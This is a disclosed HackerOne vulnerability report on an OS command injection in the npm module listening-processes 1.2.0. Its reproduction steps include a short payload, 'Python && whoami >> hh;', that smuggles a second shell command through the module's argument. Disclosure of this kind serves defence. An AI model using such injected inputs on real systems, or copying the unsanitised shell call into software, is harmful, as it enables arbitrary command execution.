---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2020-02-02
submitted: 2019-03-18T08:14:28.733Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "notpwnguy"
source: "https://hackerone.com/reports/511459"
title: "[listening-processes] Command Injection"
---
# [listening-processes] Command Injection

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Node.js third-party modules | **Disclosed:** 2020-02-02

- Report: [https://hackerone.com/reports/511459](https://hackerone.com/reports/511459)
- CWE: OS Command Injection
- Submitted: 2019-03-18T08:14:28.733Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Command Injection in listening-processes
It allows an attacker to execute arbitrary commands.

# Module

**module name:** listening-processes
**version:** 1.2.0
**npm page:** `https://www.npmjs.com/package/listening-processes`

## Module Description

> A simple NPM module for retrieving pertinent info on processes which are listening on local ports, and for killing those processes using shell commands lsof, ps, and kill in the background.

## Module Stats

6 downloads in the last day
12 downloads in the last week
28 downloads in the last month

# Vulnerability

## Vulnerability Description

> An attacker can execute arbitrary commands by escaping the binaries used by the module since it uses bash commands. 

## Steps To Reproduce:

```
$ node
> const processes = require('listening-processes')
> processes(`'Python && whoami >> hh;'`)
/bin/sh: \s.*:[0-9]* (LISTEN): command not found
{ Python:
   [ { command: 'Python',
       pid: '14720',
       port: '8000',
       invokingCommand:
        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }
```
```
$ cat hh
notpwnguy
```
## Patch

> If you're able to provide a patch with the fix please post it in this section

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OPERATING SYSTEM VERSION : Mac Os
- NODEJS VERSION : v10.5.0
- NPM VERSION : 6.2.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Arbitrary Commands can be executed!

## Timeline

- **Report Filed**
- **2019-03-18** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **Report Triaged**
- **Report Title Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
